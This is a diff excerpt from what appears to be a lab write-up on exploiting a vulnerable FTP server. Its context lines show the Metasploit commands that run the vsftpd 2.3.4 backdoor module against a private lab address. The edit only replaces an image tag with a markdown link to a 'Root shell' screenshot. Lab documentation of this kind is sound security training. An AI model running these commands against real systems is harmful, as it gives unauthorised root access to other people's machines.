@@ -64,8 +64,7 @@ msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.101
 run
-<img width="1152" height="666" alt="metasploit_success" src="https://github.com/user-attachments/assets/6b3af973-8cdf-49d0-bc26-c274d63a4c0e" />
-
+![Root shell](metasploit_success.png)
 
 ## Lessons Learned
 
